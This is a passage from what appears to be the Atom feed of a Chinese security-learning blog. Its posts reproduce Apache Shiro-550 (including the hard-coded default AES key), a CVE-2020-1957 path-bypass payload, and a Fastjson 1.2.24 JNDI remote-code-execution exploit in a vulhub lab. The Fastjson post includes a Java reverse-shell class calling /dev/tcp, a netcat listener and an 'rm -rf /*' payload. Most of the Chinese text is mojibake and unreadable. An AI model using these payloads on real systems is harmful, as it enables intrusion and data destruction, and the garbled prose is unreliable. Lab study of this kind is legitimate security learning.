Cookieï¼‰</strong>ï¼Œä¸‹æ¬¡æ¥ä¸ç”¨è¾“å¯†ç ï¼Œç›´æ¥åˆ·å¡è¿›ã€‚ä½†è¿™å®¶ä¼šæ‰€çš„ä¼šå‘˜å¡åŠ å¯†æ–¹å¼æœ‰é—®é¢˜â€”â€”<strong>ç”¨çš„æ˜¯ä¸€æŠŠé€šç”¨é’¥åŒ™ï¼ˆé»˜è®¤å¯†é’¥ï¼‰</strong>ï¼Œå¯¼è‡´åäººèƒ½ä¼ªé€ ä»»æ„ä¼šå‘˜å¡ã€‚</p><hr><h3 id="æµç¨‹æ‹†è§£"><a href="#æµç¨‹æ‹†è§£" class="headerlink" title="æµç¨‹æ‹†è§£"></a><strong>æµç¨‹æ‹†è§£</strong></h3><ol><li><strong>ç™»å½•æˆåŠŸ</strong>ï¼š<br>ä½ è¾“å…¥è´¦å·å¯†ç æ­£ç¡®ï¼Œå‰å°ï¼ˆShiroï¼‰è¯´ï¼šâ€œè®°ä½è¿™ä¸ªç”¨æˆ·ï¼Œä¸‹æ¬¡ç›´æ¥åˆ·ä¼šå‘˜å¡è¿›ï¼â€<br>â†’ è§¦å‘ <code>onSuccessfulLogin</code> æ–¹æ³•ã€‚</li><li><strong>åˆ¶ä½œä¼šå‘˜å¡</strong>ï¼š<br>å‰å°æŠŠä½ çš„ä¿¡æ¯ï¼ˆç”¨æˆ·åã€æƒé™ï¼‰â€‹<strong>æ‰“åŒ…æˆå¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰â€‹</strong>ï¼Œç”¨<strong>ä¼šæ‰€ç»Ÿä¸€åŒ…è£…ç›’ï¼ˆåŠ å¯†ï¼‰â€‹</strong>å°å¥½ï¼Œå†è´´ä¸ªå¿«é€’å•ï¼ˆBase64ç¼–ç ï¼‰ã€‚<br>â†’ è°ƒç”¨ <code>rememberIdentity</code> â†’ <code>rememberSerializedIdentity</code>ã€‚</li><li><strong>å¿«é€’é…é€</strong>ï¼š<br>å‰å°æŠŠåŒ…è£…å¥½çš„å¿«é€’ï¼ˆåŠ å¯†åçš„æ•°æ®ï¼‰å¡è¿›ä½ çš„æµè§ˆå™¨ï¼Œå˜æˆä¸€å¼ <strong>ä¼šå‘˜å¡ï¼ˆCookieï¼‰â€‹</strong>ã€‚<br>â†’ è®¾ç½®Cookieå€¼ <code>rememberMe=åŠ å¯†åçš„Base64å­—ç¬¦ä¸²</code>ã€‚</li><li><strong>æ¼æ´åœ¨å“ª</strong>ï¼š<ul><li><strong>é€šç”¨é’¥åŒ™</strong>ï¼šæ‰€æœ‰ä¼šå‘˜å¡éƒ½ç”¨åŒä¸€æŠŠé’¥åŒ™åŠ å¯†ï¼ˆShiroé»˜è®¤ç¡¬ç¼–ç å¯†é’¥ï¼‰ã€‚</li><li><strong>åŒ…è£…ç›’å¯ç ´è§£</strong>ï¼šåºåˆ—åŒ–æ•°æ®ç”¨çš„æ˜¯å¯é¢„æµ‹çš„åŠ å¯†æ–¹å¼ï¼ˆAES-CBCï¼‰ã€‚<br>â†’ åäººæ‹¿åˆ°ä½ çš„ä¼šå‘˜å¡ï¼Œæ‹†å¼€åŒ…è£…ç›’ï¼Œæ¢ä¸Šè‡ªå·±çš„æ¯’åŒ…è£¹ï¼ˆæ¶æ„ä»£ç ï¼‰ï¼Œå†ç”¨åŸæ ·å°å¥½ï¼Œç³»ç»Ÿä¼šæ­£å¸¸è§£å¯†æ‰§è¡Œã€‚</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.é¦–å…ˆæ­£å¸¸ç™»å½•ï¼Œç„¶åç”Ÿæˆå¸¦æœ‰remembermeçš„è¿”å›cookieå€¼ã€‚ 2.ç”Ÿæˆcookieï¼Œshiroä¼šæä¾›remembermeåŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡cookieè®°å½•ç™»å½•ç”¨æˆ·ï¼Œä»è€Œè®°å½•ç™»å½•ç”¨æˆ·çš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼Œå³ä¸‹æ¬¡æ— éœ€ç™»å½•å³å¯è®¿é—®ã€‚å¤„ç†remembermeçš„cookieçš„ç±»ä¸ºorg.apache.shiro.web.mgt.CookieRememberMeManager 3.ä¹‹åè¿›å…¥serializeï¼Œå¯¹ç™»å½•è®¤è¯ä¿¡æ¯è¿›è¡Œåºåˆ—åŒ– 4.ç„¶ååŠ å¯†ï¼Œè°ƒç”¨aesç®—æ³•ã€‚ 5.åŠ å¯†ç»“æŸï¼Œç„¶ååœ¨åœ¨org/apache/shiro/web/mgt/CookieRememberMeManager.javaçš„rememberSerializedIdentityæ–¹æ³•ä¸­è¿›è¡Œbase64ç¼–ç ï¼Œå¹¶é€šè¿‡responseè¿”å› 6.è§£æcookie 7.å…ˆè§£å¯†åœ¨ååºåˆ—åŒ– 8.AESæ˜¯å¯¹ç§°åŠ å¯†ï¼ŒåŠ è§£å¯†å¯†é’¥éƒ½æ˜¯ç›¸åŒçš„ï¼Œå¹¶ä¸”shiroéƒ½æ˜¯å°†å¯†é’¥ç¡¬ç¼–ç  9.è°ƒç”¨cryptæ–¹æ³•åˆ©ç”¨å¯†æ–‡ï¼Œkeyï¼Œivè¿›è¡Œè§£å¯†,è§£å¯†å®Œæˆåè¿›å…¥ååºåˆ—åŒ–ï¼Œçœ‹ä¸Šé¢çš„public AbstractRememberMeManagerè¿™é‡Œç”¨çš„æ˜¯é»˜è®¤ååºåˆ—åŒ–ç±»,ç„¶åè§¦å‘ç”Ÿæˆååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå¸¦æœ‰Remembermeçš„è¿”å›cookie-&gt;å¤„ç†remembermeçš„cookieçš„ç±»ä¸ºorg.apache.shiro.web.mgt.CookieRememberMeManager-&gt;åºåˆ—åŒ–ç™»å½•ä¿¡æ¯-&gt;äº¤ç»™aesè¿›è¡ŒåŠ å¯†-&gt;åŠ å¯†åorg&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.javaçš„rememberSerializedIdentityè¿›è¡Œbase64ç¼–ç -&gt;è§£æcookie-&gt;å…ˆè§£å¯†åœ¨ååºåˆ—åŒ–</p><p>åˆ¤æ–­AESå¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯†é’¥ä¸æ­£ç¡®æˆ–ç±»å‹è½¬æ¢å¼‚å¸¸æ—¶ï¼Œç›®æ ‡ResponseåŒ…å«Set-Cookieï¼šrememberMe=deleteMeå­—æ®µï¼Œ</span><br><span class="line"></span><br><span class="line">è€Œå½“å¯†é’¥æ­£ç¡®ä¸”æ²¡æœ‰ç±»å‹è½¬æ¢å¼‚å¸¸æ—¶ï¼Œè¿”å›åŒ…ä¸å­˜åœ¨Set-Cookieï¼šrememberMe=deleteMeå­—æ®µ</span><br></pre></td></tr></table></figure><p>å·¥å…·ï¼š<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases</a></p><p>shrio-550ä½¿ç”¨çš„æ˜¯é»˜è®¤å¯†é’¥kPH+blxk5D2deZilxcaaaA&#x3D;&#x3D;</p><p>å·¥å…·éå¸¸ç»™åŠ›å¯ä»¥è·å¾—å¯†é’¥</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741351728827.jpg"></p><p>è¿™å°±ä¸å»å¤ç°äº†</p><h1 id="Shiro-è®¤è¯ç»•è¿‡æ¼æ´-CVE-2020-1957"><a href="#Shiro-è®¤è¯ç»•è¿‡æ¼æ´-CVE-2020-1957" class="headerlink" title="[Shiro-è®¤è¯ç»•è¿‡æ¼æ´(CVE-2020-1957)]"></a>[Shiro-è®¤è¯ç»•è¿‡æ¼æ´(CVE-2020-1957)]</h1><p>æ ¸å¿ƒç‚¹å°±æ˜¯</p><ol><li><p><strong>åœºæ™¯è®¾å®š</strong>ï¼š</p><ul><li><strong>é—¨å«ï¼ˆShiroï¼‰</strong>ï¼šè´Ÿè´£æ£€æŸ¥æ¯ä¸ªå®¢äººèƒ½ä¸èƒ½è¿›VIPå®¤ï¼Œè§„åˆ™æ˜¯â€æ‰€æœ‰æƒ³è¿› <code>/vip</code> æˆ¿é—´çš„äººå¿…é¡»å‡ºç¤ºä¼šå‘˜å¡â€ã€‚</li><li><strong>ç®¡å®¶ï¼ˆSpringï¼‰</strong>ï¼šè´Ÿè´£å¸¦å®¢äººå»å®é™…æˆ¿é—´ï¼Œä½†å®ƒæœ‰ä¸ªæ€ªç™–â€”â€”<strong>çœ‹åˆ°åˆ†å· <code>;</code> å°±ä¼šè‡ªåŠ¨æˆªæ–­</strong>åé¢çš„å†…å®¹ã€‚</li></ul></li><li><p><strong>åäººå¦‚ä½•æ··è¿›VIPå®¤</strong>ï¼š<br>åäººä¸å»æ­£é—¨ <code>/vip</code>ï¼Œè€Œæ˜¯æ•…æ„èµ°æ­ªè·¯ï¼š</p><ul><li><strong>æ„é€ å‡è·¯å¾„</strong>ï¼š<code>/vip;/../ç§˜å¯†é€šé“</code></li><li><strong>é—¨å«è§†è§’</strong>ï¼šæ£€æŸ¥è·¯å¾„æ˜¯ <code>/vip</code>ï¼ˆå› ä¸ºShiroçœ‹åˆ°åˆ†å· <code>;</code> å°±åœä¸‹ï¼‰ï¼Œå‘ç°è§„åˆ™æ˜¯å…è®¸æ‰€æœ‰äººè®¿é—® <code>/vip</code>ï¼ˆæœªé…ç½®éœ€è¦ç™»å½•ï¼‰ï¼Œç›´æ¥æ”¾è¡Œã€‚</li><li><strong>ç®¡å®¶è§†è§’</strong>ï¼šå¤„ç†è·¯å¾„æ—¶ï¼Œçœ‹åˆ°åˆ†å· <code>;</code> å°±æˆªæ–­æˆ <code>/vip</code>ï¼Œå®é™…å´æŠŠå®¢äººå¸¦åˆ° <code>/ç§˜å¯†é€šé“</code>ï¼ˆVIPå®¤åé—¨ï¼‰ã€‚</li></ul><p>â†’ <strong>é—¨å«ä»¥ä¸ºä½ å»çš„æ˜¯å…¬å¼€åŒºåŸŸï¼Œç®¡å®¶å´æŠŠä½ å¸¦è¿›äº†VIPå®¤</strong>ï¼Œå…¨ç¨‹æ²¡æŸ¥ä¼šå‘˜å¡ï¼</p></li></ol><p>è¿™ä¸ªæ–‡ç« å†™çš„ä¹Ÿå¾ˆå¥½<a href="https://www.cnblogs.com/dhan/p/18423713">https://www.cnblogs.com/dhan/p/18423713</a></p><p>è¿™ä¸ªæ–‡ç« ä¸»æµpayloadæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx/..;/admin/</span><br></pre></td></tr></table></figure><p>é¦–å…ˆshiroå¤„ç†çš„</p><p>å°†åˆ†å·åé¢çš„å†…å®¹ç›´æ¥å¤„ç†äº†å¾—åˆ°xxx&#x2F;..ï¼Œæ˜¾ç¤ºä¸æ˜¯è¦å»&#x2F;adminå¯ä»¥ç›´æ¥bypassæ‰äº†shiroè®¤è¯</p><p>springè®¤è¯</p><p>è·Ÿè¿›removeSemicolonContentInternal(requestUri)æ–¹æ³•ï¼Œä»–çš„ä½œç”¨å°±æ˜¯ï¼š<code>ç§»é™¤uriä¸­/ä¸/ä¹‹é—´çš„;åˆ†å·ä»¥åŠ;åˆ†å·åé¢çš„å†…å®¹</code></p><p>æ ¹æ®è¿™å¥è¯å¯ä»¥å¾—çŸ¥æœ€åçš„uriåº”è¯¥æ˜¯ï¼š</p><p><code>/xxx/../admin/ == /admin/</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulhubé¶åœºå¤ç°&lt;/p&gt;
&lt;p&gt;æ¼æ´åŸç†&lt;/p&gt;
&lt;p&gt;Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–</summary>
      
    
    
    
    
    <category term="shiro" scheme="https://gu0f3n.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>â€œfastjsonåˆæ¢â€</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/</id>
    <published>2025-03-03T12:02:19.000Z</published>
    <updated>2025-03-05T07:20:54.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-24-RCEæ¼æ´"><a href="#Fastjson1-2-24-RCEæ¼æ´" class="headerlink" title="Fastjson1.2.24-RCEæ¼æ´"></a>Fastjson1.2.24-RCEæ¼æ´</h1><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚å³fastjsonçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯å°†Java Beanåºåˆ—åŒ–æˆJSONå­—ç¬¦ä¸²ï¼Œè¿™æ ·å¾—åˆ°å­—ç¬¦ä¸²ä¹‹åå°±å¯ä»¥é€šè¿‡æ•°æ®åº“ç­‰æ–¹å¼è¿›è¡ŒæŒä¹…åŒ–äº†ã€‚</p><p> æ¼æ´åŸç† </p><p>å†ç”¨Fastjsonè§£æJSONæ•°æ®çš„æ—¶å€™</p><p>å‡å¦‚æ”»å‡»è€…ä¼ªé€ ä¸€æ®µç‰¹æ®Šçš„çš„æ¶æ„çš„JSONæ•°æ® </p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://é»‘å®¢ä»“åº“/å±é™©ç‰©å“&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æ”»å‡»è€…ä¼ªé€ äº†@typeæ ‡ç­¾ éœ€è¦ç”¨com.sun.rowset.JdbcRowSetImplï¼ˆæŒ‡å®šååºåˆ—åŒ–ç±»ï¼‰è¿›è¡Œå¤„ç† </p><p>è¿™ä¸ªjdbcRowSetlmpl æˆ‘ä»¬ç†è§£ä¸ºåˆ†æ‹£å‘˜ é‚£ä¹ˆ åˆ†æ‹£å‘˜è®°å½•ä¸‹â€œéœ€è¦è”ç³»é»‘å®¢ä»“åº“çš„æŒ‡ä»¤â€</p><p>autoCommitâ€: trueåˆ™ä¼šè§¦å‘setAutoCommit()æ–¹æ³• ç›¸å½“äºè®©jdbcRowSetlmplç«‹å³æ‰§è¡Œ</p><p>ç„¶åæˆ‘ä»¬å°±è¿›è¡Œæ¶æ„ä»“åº“çš„è¿æ¥ï¼ˆJNDLæ³¨å…¥ï¼‰</p><p>åˆ†æ‹£å‘˜ï¼ˆjdbcRowSetlmplï¼‰å°±ä¼šæ ¹æ®rmi:&#x2F;&#x2F;é»‘å®¢ä»“åº“&#x2F;å±é™©ç‰©å“åœ°å€æ‹¨æ‰“ç”µè¯ï¼ˆå‘èµ·JNDLè¯·æ±‚ï¼‰è€Œé»‘å®¢ä»“åº“ï¼ˆæ”»å‡»è€…æ­å»ºäºŒç‚¹RMIæœåŠ¡å™¨ï¼‰å°±ä¼šå›åº”</p><p>â€œè¯·åˆ°http:&#x2F;&#x2F;æ¶æ„ç«™ç‚¹&#x2F;Exploit.classé¢†å–åŒ…è£¹â€</p><p><strong>åŠ è½½â€œå±é™©ç‰©å“â€ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</strong></p><p>å¿«é€’å…¬å¸ç³»ç»Ÿï¼ˆJVMï¼‰ä»æ¶æ„ç«™ç‚¹ä¸‹è½½çš„Exploit.classå¹¶è‡ªåŠ¨æ‹†åŒ…æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.class é™æ€ä»£ç å—</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">&quot;rm -rf /*&quot;</span>); <span class="comment">// åˆ é™¤æœåŠ¡å™¨æ•°æ®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæ”»å‡»è€…é€šè¿‡ä¸€ä¸ªä¼ªé€ çš„åŒ…è£¹ï¼ŒæˆåŠŸåŠ«æŒ<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741005491298.jpg" alt="img">äº†æ•´ä¸ªå¿«é€’</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>æ­å»ºç¯å¢ƒå°±ä¸æ¼”ç¤ºäº†</p><p>é¦–å…ˆåœ¨vulhubfastjsonä¸‹é¢ åˆ›å»ºä¸€ä¸ªtest.java å†…å®¹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.20.0.1/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›®çš„å°±æ˜¯æŠŠtest.txtä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº </p><p>ç„¶åè¿›è¡Œç¼–è¯‘ Javac reverse.java</p><p>ç„¶åæˆ‘ä»¬åœ¨ç¯å¢ƒç›®å½•ä¸‹èµ·ä¸€ä¸ªhttpæœåŠ¡ è¿™ä¸€æ­¥éƒ¨ç½²rmiæŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/007d447d-9ddc-4927-a3f5-1ce87e375326.png"></p><p>ç«¯å£ä¸º5623</p><p>ç„¶åéƒ¨ç½²rmiæœåŠ¡å™¨</p><p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/de6ca6b9-8cda-4cb2-80a9-bec740601853.png"></p><p>ç«¯å£ä¸º8520</p><p>æ¥ç€å»webé¡µé¢æŠ“åŒ…</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/5cff3b0f-4fe6-4187-ba58-5b3a37871df1.png"></p><p>å‘åŒ…å‰å…ˆnc -lvp 4563</p><p>å‘åŒ…å‘ç°æˆåŠŸåå¼¹shell</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/223a33e5-0d7d-45da-9eb4-52096a2f9f52.png"></p><p>å†™çš„æ¯”è¾ƒå¥½çš„æ–‡ç« <a href="https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/">https://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fastjson1-2-24-RCEæ¼æ´&quot;&gt;&lt;a href=&quot;#Fastjson1-2-24-RCEæ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;Fastjson1.2.24-RCEæ¼æ´&quot;&gt;&lt;/a&gt;Fastjson1.2.24-RCEæ¼æ´&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="fastjson" scheme="https://gu0f3n.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>è·Ÿç€å°è¿ªçš„ç¬¬äºŒå¤©</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2025-03-03T04:17:54.000Z</published>
    <updated>2025-03-30T12:39:12.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ‰“ç‚¹"><a href="#ä¿¡æ¯æ‰“ç‚¹" class="headerlink" title="ä¿¡æ¯æ‰“ç‚¹"></a>ä¿¡æ¯æ‰“ç‚¹</h1><p>1ã€æ‰“ç‚¹-Webæ¶æ„-è¯­è¨€&amp;ä¸­é—´ä»¶&amp;æ•°æ®åº“&amp;ç³»ç»Ÿç­‰<br>2ã€æ‰“ç‚¹-Webæºç -CMSå¼€æº&amp;é—­æºå”®å–&amp;è‡ªä¸»ç ”å‘ç­‰<br>3ã€æ‰“ç‚¹-Webæºç è·å–-æ³„éœ²å®‰å…¨&amp;èµ„æºç›‘æ§&amp;å…¶ä»–ç­‰<br>4ã€æ‰“ç‚¹-WebåŸŸå-å­åŸŸå&amp;ç›¸ä¼¼åŸŸå&amp;åæŸ¥åŸŸå&amp;æ—æ³¨ç­‰</p><p>åŒºåˆ†windows å’ŒLinux å¯ä»¥ç”¨ å¤§å†™å°å†™æ¥åŒºåˆ†</p><p>windowsä¸Šå¯¹æ–‡ä»¶çš„å¤§å°å†™ä¸åŒºåˆ† </p><p>ä¹Ÿå¯ä»¥é€šè¿‡pingç½‘ç«™æ¥åˆ¤æ–­ ä¸€èˆ¬ window de ttl&gt;100 Linux&lt;100</p><p>æ•°æ®åˆ¤æ–­ æ­å»ºç»„åˆ ç«¯å£æ‰«æ</p><p>#çŸ¥è¯†ç‚¹ï¼š<br>1ã€CMSæŒ‡çº¹è¯†åˆ«æºç è·å–æ–¹å¼<br>2ã€ä¹ æƒ¯&amp;é…ç½®&amp;ç‰¹æ€§ç­‰è·å–æ–¹å¼<br>3ã€æ‰˜ç®¡èµ„äº§å¹³å°èµ„æºæœç´¢ç›‘æ§</p><p> æºç æ³„éœ²</p><p>cmsè¯†åˆ« äº‘æºª</p><p>ç®¡ç†å‘˜ä¹ æƒ¯ä¸å¥½ å¤‡ä»½æ³„éœ²</p><p>é…ç½®ä¸å½“ git æ³„éœ² |å‘å¸ƒä»£ç æ—¶å€™ æ²¡æœ‰å°†.gitåˆ é™¤ ç›´æ¥åŒæ­¥ä¸Šä¼ é“æœåŠ¡å™¨å…¶ä¸Š</p><p> svnæ³„éœ² ds_Storeæ³„éœ²|åŒæ­¥å‘å¸ƒé“æœåŠ¡å™¨ä¸Š</p><p>phpç‰¹æ€§ composer.json æ³„éœ² é…ç½®æ€§è¯´æ˜æ€§ æ–‡ä»¶ è·å¾—ç›¸å…³ä¿¡æ¯  </p><p>ä¸‹è½½é…åˆ WEB-INFæ³„éœ² å¿…é¡»è¦ä¸‹è½½æ–‡ä»¶çš„æ¼æ´ </p><p>GITHUBæ³„éœ² è¯­æ³•æœç´¢&amp;ç®¡æ£€æµ‹æœç´¢</p><p>è·å–ç½‘ç»œä¿¡æ¯-æœåŠ¡å‚å•†&amp;ç½‘ç»œæ¶æ„<br>è·å–æœåŠ¡ä¿¡æ¯-åº”ç”¨åè®®&amp;å†…ç½‘èµ„äº§<br>è·å–é˜»ç¢ä¿¡æ¯-CDN&amp;WAF&amp;è´Ÿè½½&amp;é˜²ç«å¢™</p><p>å†…ç½‘èµ„äº§æŸ¥è¯¢  </p><p>æ—æ³¨ï¼šåŒæœåŠ¡å™¨ä¸‹é¢çš„ä¸åŒWEBåº”ç”¨æŸ¥è¯¢æŠ€æœ¯<br>Cæ®µï¼šåŒç½‘æ®µä¸‹é¢çš„ä¸åŒæœåŠ¡å™¨IPä¸‹çš„WEBåº”ç”¨æŸ¥è¯¢æŠ€æœ¯</p><p>æ—æ³¨æŸ¥è¯¢ </p><p>cæ®µæŸ¥è¯¢ ipåæŸ¥åŸŸå</p><p>cdn æŸ¥è¯¢ è¶…çº§ping å»æµ‹è¯•å…¨å›½å¯¹å…¶è®¿é—®çš„é€Ÿåº¦æ¥æ£€æµ‹ç½‘ç«™å¼€é€šäº†cdn</p><p>ç½‘ç«™waf  åŒºåˆ†</p><p>è¶…çº§pingï¼šCDNæœåŠ¡è¯†åˆ«<br>Masscanï¼šç«¯å£æ‰«æï¼Œåº”ç”¨åè®®<br>Wafw00fï¼šWebåº”ç”¨é˜²æŠ¤é˜²ç«å¢™è¯†åˆ«<br>Nmapï¼šç«¯å£æ‰«æï¼Œåº”ç”¨åè®®ï¼Œé˜²ç«å¢™è¯†åˆ«<br>lbdï¼šè´Ÿè½½å‡è¡¡ï¼Œå¹¿åŸŸç½‘è´Ÿè½½å‡è¡¡ï¼Œåº”ç”¨å±‚è´Ÿè½½å‡è¡¡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¿¡æ¯æ‰“ç‚¹&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ‰“ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ‰“ç‚¹&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ‰“ç‚¹&lt;/h1&gt;&lt;p&gt;1ã€æ‰“ç‚¹-Webæ¶æ„-è¯­è¨€&amp;amp;ä¸­é—´ä»¶&amp;amp;æ•°æ®åº“&amp;amp;ç³»ç»Ÿç­‰&lt;br&gt;2ã€æ‰“ç‚¹-Webæºç -CMSå¼€æº&amp;amp;</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>è·Ÿç€å°è¿ªç¬¬ä¸€å¤©</title>
    <link href="https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2025-02-28T12:17:15.000Z</published>
    <updated>2025-03-14T11:20:03.845Z</updated>
    
    <content type="html"><![CDATA[<p>è·Ÿç€å°è¿ªå­¦ä¹ ç¬¬ä¸€å¤©</p><p>åè¯è§£é‡Š</p><p>POCï¼šå…¨ç§°â€™ProofofConceptâ€™ï¼Œä¸­æ–‡â€™æ¦‚å¿µéªŒè¯â€™ï¼Œå¸¸æŒ‡ä¸€æ®µæ¼æ´è¯æ˜çš„ä»£ç ã€‚<br>EXPï¼šå…¨ç§°â€™Exploitâ€™ï¼Œä¸­æ–‡åˆ©ç”¨ï¼ŒæŒ‡åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„åŠ¨ä½œã€‚<br>Payloadï¼šä¸­æ–‡æœ‰æ•ˆè½½è·ï¼ŒæŒ‡æˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ã€‚<br>Shellcodeï¼šç®€å•ç¿»è¯‘â€™shellä»£ç â€™ï¼Œæ˜¯Payloadçš„ä¸€ç§ï¼Œç”±äºå…¶å»ºç«‹æ­£å‘&#x2F;åå‘shellè€Œå¾—åã€‚</p><p>ç½‘ç«™æ­å»ºå‰ç½®çŸ¥è¯†</p><p>åŸŸå å­åŸŸå DNS http&#x2F;https è¯ä¹¦</p><p>webåº”ç”¨æ¡†æ¶æ¶æ„ </p><p>ç†è§£ä¸åŒwebåº”ç”¨ç»„æˆæ 